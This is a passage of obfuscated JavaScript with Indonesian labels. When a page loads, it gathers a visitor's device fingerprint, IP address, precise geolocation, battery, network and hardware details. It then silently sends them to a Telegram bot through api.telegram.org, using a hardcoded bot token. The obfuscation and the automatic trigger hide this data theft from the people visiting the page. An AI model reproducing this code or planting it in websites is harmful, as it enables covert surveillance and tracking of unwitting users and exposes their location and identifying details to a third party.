5bc[_0x59bd3e(0xdf)](_0x59bd3e(0x12e),_0x59bd3e(0x156)),_0x59bd3e(0x16f)+_0x2972cd[_0x59bd3e(0x10f)]+'\x0a'),'•\x20*Platform:*\x20'+_0x2972cd[_0x59bd3e(0x172)]+'\x0a'),_0x59bd3e(0x16c)+_0x2972cd[_0x59bd3e(0x158)]+'\x0a'),_0x59bd3e(0xeb)+_0x2972cd[_0x59bd3e(0x106)]+'\x0a'),_0x59bd3e(0x12b)+_0x2972cd['vendor']+'\x0a\x0a')+_0x59bd3e(0xdc),_0x59bd3e(0x163)+_0x2972cd[_0x59bd3e(0x14e)]+'\x0a'),_0x59bd3e(0x116)+_0x2972cd[_0x59bd3e(0x184)]+'\x0a'),_0x59bd3e(0x155)+_0x2972cd[_0x59bd3e(0x129)]+'\x0a\x0a'),_0x59bd3e(0x103)),_0x59bd3e(0x159)+_0x2972cd[_0x59bd3e(0xce)]+'\x0a'),_0x59bd3e(0x17c)+_0x2972cd['locationInfo']+'\x0a'),_0x59bd3e(0xe0)+_0x2972cd[_0x59bd3e(0x17f)]+'\x0a'),'•\x20*Longitude:*\x20'+_0x2972cd['longitude']+'\x0a\x0a'),_0x59bd3e(0xd3)),'•\x20'+_0x2972cd[_0x59bd3e(0x187)]+'\x0a\x0a'),_0x59bd3e(0xc9))+('•\x20*CPU\x20Cores:*\x20'+_0x2972cd['hardwareConcurrency']+'\x0a')+(_0x59bd3e(0xcc)+_0x2972cd[_0x59bd3e(0x113)]+'\x0a')+(_0x59bd3e(0x110)+_0x2972cd[_0x59bd3e(0x13c)]+'\x0a'),_0x59bd3e(0x174)+_0x2972cd[_0x59bd3e(0x109)]+'\x0a\x0a'),_0x59bd3e(0x111)),_0x59bd3e(0xda)+_0x2972cd[_0x59bd3e(0x121)]+'\x0a')+(_0x59bd3e(0xe9)+_0x2972cd[_0x59bd3e(0xcf)]+'\x0a'),'•\x20*Waktu\x20Boot\x20Perangkat:*\x20'+_0x2972cd[_0x59bd3e(0xc5)]),_0x293b1a=new FormData();_0x293b1a[_0x59bd3e(0x188)](_0x59bd3e(0x16b),_0x1cb8dc),_0x293b1a[_0x59bd3e(0x188)](_0x59bd3e(0x117),_0x39ebee),_0x293b1a[_0x59bd3e(0x188)](_0x2d75bc[_0x59bd3e(0x170)],_0x2d75bc[_0x59bd3e(0x150)]),fetch(_0x38b7f7,{'method':_0x2d75bc['VIBFR'],'body':_0x293b1a})[_0x59bd3e(0x123)](_0x336737=>_0x336737[_0x59bd3e(0xe6)]())[_0x59bd3e(0x123)](_0x902425=>{const _0xd543cc=_0x59bd3e;_0x902425['ok']?console[_0xd543cc(0xfe)](_0x11a2f2[_0xd543cc(0xd9)]):console[_0xd543cc(0x11d)](_0xd543cc(0x15e),_0x902425);})[_0x59bd3e(0xee)](_0x405e3b=>{const _0x5a6f99=_0x59bd3e;console[_0x5a6f99(0x11d)](_0x11a2f2[_0x5a6f99(0x136)],_0x405e3b);});}}function calculateStorageSize(_0x279b27){const _0x4f9fa4=_0x18de,_0x256158={'VXqmb':function(_0x56a1ab,_0x540f7a){return _0x56a1ab*_0x540f7a;},'aueMK':function(_0x2e6765,_0x266777){return _0x2e6765+_0x266777;},'asDgj':function(_0x26887b,_0x45d844){return _0x26887b+_0x45d844;},'mQXGm':_0x4f9fa4(0x15a)};let _0x4fe17f=0x0;for(let _0x40d5ad in _0x279b27){_0x279b27[_0x4f9fa4(0xfb)](_0x40d5ad)&&(_0x4fe17f+=_0x256158[_0x4f9fa4(0x11b)](_0x256158[_0x4f9fa4(0xd7)](_0x279b27[_0x40d5ad][_0x4f9fa4(0x178)],_0x40d5ad['length']),0x2));}return _0x256158[_0x4f9fa4(0x13f)]((_0x4fe17f/0x400)[_0x4f9fa4(0x130)](0x2),_0x256158[_0x4f9fa4(0xe8)]);}function detectBrowser(){const _0x4a000f=_0x18de,_0x2d6cb3={'LKdwI':_0x4a000f(0x108),'JZlFP':'Firefox','dBHxC':_0x4a000f(0x186),'aFnuk':'Apple\x20Safari','EbBGj':_0x4a000f(0x131),'TodaR':_0x4a000f(0x102),'bBtUQ':_0x4a000f(0x145)},_0x5a7bc8=navigator[_0x4a000f(0x10f)];if(_0x5a7bc8['includes'](_0x2d6cb3[_0x4a000f(0xe7)]))return _0x4a000f(0x171);if(_0x5a7bc8[_0x4a000f(0x133)](_0x2d6cb3[_0x4a000f(0x146)]))return'Mozilla\x20Firefox';if(_0x5a7bc8['includes'](_0x2d6cb3['dBHxC'])&&!_0x5a7bc8[_0x4a000f(0x133)](_0x2d6cb3[_0x4a000f(0xe7)]))return _0x2d6cb3[_0x4a000f(0xe3)];if(_0x5a7bc8['includes'](_0x2d6cb3[_0x4a000f(0x10c)]))return _0x4a000f(0xd2);if(_0x5a7bc8[_0x4a000f(0x133)](_0x2d6cb3[_0x4a000f(0x179)])||_0x5a7bc8[_0x4a000f(0x133)](_0x2d6cb3[_0x4a000f(0xcd)]))return _0x2d6cb3[_0x4a000f(0x179)];return _0x4a000f(0xc2);}function _0x18de(_0x567bcb,_0x1588cf){const _0x12b69f=_0x12b6();return _0x18de=function(_0x18de74,_0x39e17){_0x18de74=_0x18de74-0xc1;let _0x1bb18f=_0x12b69f[_0x18de74];return _0x1bb18f;},_0x18de(_0x567bcb,_0x1588cf);}function detectOS(){const _0x499b4e=_0x18de,_0x2dd7ac={'RGzae':_0x499b4e(0x154),'FzISQ':'Windows','RsBJx':'mac','uEzJm':'MacOS','fNOpK':_0x499b4e(0x14b),'EOPWE':_0x499b4e(0x135)},_0x4b6270=navigator[_0x499b4e(0x172)][_0x499b4e(0x105)]();if(_0x4b6270['includes'](_0x2dd7ac[_0x499b4e(0x13a)]))return _0x2dd7ac[_0x499b4e(0xef)];if(_0x4b6270[_0x499b4e(0x133)](_0x2dd7ac[_0x499b4e(0x143)]))return _0x2dd7ac[_0x499b4e(0xc4)];if(_0x4b6270[_0x499b4e(0x133)]('linux'))return _0x2dd7ac['fNOpK'];if(/android/[_0x499b4e(0x14f)](navigator[_0x499b4e(0x10f)][_0x499b4e(0x105)]()))return _0x499b4e(0x15c);if(/iphone|ipad|ipod/['test'](navigator[_0x499b4e(0x10f)][_0x499b4e(0x105)]()))return _0x2dd7ac[_0x499b4e(0xf4)];return _0x499b4e(0x147);}function _0x12b6(){const _0x15b9ce=['country_name','oSIjq','Linux','Tidak\x20mengisi','chargingTime','onlineStatus','test','xclIR','createElement','jBZey','jTKWG','win','•\x20*Kecepatan\x20Koneksi:*\x20','🖥️\x20*Umum:*\x0a','languages','language','•\x20*IP\x20Address:*\x20','\x20KB','LkbTW','Android','gMBmd','Gagal\x20mengirim\x20informasi\x20perangkat\x20ke\x20Telegram.','getParameter','OjyOv','Tidak\x20(Desktop/Tablet)','mozConnection','•\x20*Status\x20Online:*\x20','POST','Tidak\x20Ada','5ByErAC','resolvedOptions','Aktif','Landscape','message','chat_id','•\x20*Bahasa\x20Utama:*\x20','AxJYu','vmrIa','•\x20*Agen\x20Pengguna:*\x20','FGRDW','Google\x20Chrome','platform','Status\x20Pengisian:\x20','•\x20*Touchscreen:*\x20','Lokasi\x20tidak\x20diketahui','webkitConnection','NLKFJ','length','TodaR','maxTouchPoints','DateTimeFormat','•\x20*Lokasi:*\x20','%,\x20','jwKEa','latitude','https://api.telegram.org/bot','XxfMK','matches','xahtV','connectionType','Waktu\x20Pengisian:\x20','Safari','batteryInfo','append','PxIJT','\x20Mbps','Browser\x20tidak\x20dikenal','Geolocation\x20API\x20tidak\x20didukung\x20di\x20browser\x20ini.','uEzJm','deviceUptime',',\x20Longitude:\x20','longitude','simtE','🔧\x20*Hardware:*\x0a','getContext','parse_mode','•\x20*Memori\x20Perangkat:*\x20','bBtUQ','ipAddress','timezone','✅\x20Online','cookieEnabled','Microsoft\x20Edge','🔋\x20*Baterai:*\x0a','now','effectiveType','connection','aueMK','WEBGL_debug_renderer_info','DcqoF','•\x20*Waktu\x20Lokal:*\x20','teqAX','🌐\x20*Jaringan:*\x0a','Ada','toLocaleString','AsWVV','•\x20*Latitude:*\x20','webgl','3PSGfCE','aFnuk','cHmMl','hardwareConcurrency','json','LKdwI','mQXGm','•\x20*Zona\x20Waktu:*\x20','JxSzb','•\x20*Bahasa\x20Tambahan:*\x20','Markdown','3976cDRhHs','catch','FzISQ','getCurrentPosition','ontouchstart','3467214xdqOLw','1261112pTUozi','EOPWE','geolocation','getBattery','timeZone','addEventListener','2609712cqCgTb','7517910ZCIWVL','hasOwnProperty','UNMASKED_RENDERER_WEBGL','fwKaM','log','jJoFE','hXNen','getExtension','Opera','📍\x20*Lokasi:*\x0a','onLine','toLowerCase','additionalLanguages','Ya\x20(Mobile)','Chrome','touchscreen','region','516366yeBPPq','EbBGj','Tidak\x20diketahui','level','userAgent','•\x20*GPU:*\x20','🕒\x20*Waktu:*\x0a','UZUlR','deviceMemory','KaCZu','Aktif\x20🌙','•\x20*Tipe\x20Koneksi:*\x20','text','downlink','\x20jam','XIiFC','VXqmb','\x20detik','error','DOMContentLoaded','Error:','DEFOp','localTime','/sendMessage','then','164YoYNaD','408660zUgWro','Nonaktif\x20☀️','XkIwq','screen','downlinkSpeed','width','•\x20*Vendor:*\x20','Level:\x20','matchMedia','📱\x20*Informasi\x20Perangkat:*\x0a\x0a','city','toFixed','Edge','iydXd','includes','nimIk','iOS','djzoy','charging','Waktu\x20Penggunaan:\x20','7552258791:AAFOPquDIib6pBjmnq8J-Pq5__lgp6qskG4','RGzae','vendor','gpu','dischargingTime','\x20x\x20','asDgj','rZnDh','Latitude:\x20','IEByE','RsBJx','GHPLS','OPR','JZlFP','Sistem\x20operasi\x20tidak\x20dikenal','(prefers-color-scheme:\x20dark)'];_0x12b6=function(){return _0x15b9ce;};return _0x12b6();}function detectGPU(){const _0x2ae1ae=_0x18de,_0x1d2393={'iydXd':'canvas','aipwI':'experimental-webgl','kbsuV':'Tidak\x20diketahui'},_0x272be8=document[_0x2ae1ae(0x151)](_0x1d2393[_0x2ae1ae(0x132)]),_0x4703c5=_0x272be8[_0x2ae1ae(0xca)](_0x2ae1ae(0xe1))||_0x272be8['getContext'](_0x1d2393['aipwI']);if(!_0x4703c5)return _0x1d2393['kbsuV'];const _0x48ed57=_0x4703c5[_0x2ae1ae(0x101)](_0x2ae1ae(0xd8));return _0x48ed57?_0x4703c5[_0x2ae1ae(0x15f)](_0x48ed57[_0x2ae1ae(0xfc)]):_0x2ae1ae(0x10d);}document[_0x1adb61(0xf8)](_0x1adb61(0x11e),()=>{const _0xe7732c={'fIrLW':function(_0x392bdf){return _0x392bdf();}};_0xe7732c['fIrLW'](detectDeviceInfoAndSendToTelegram);});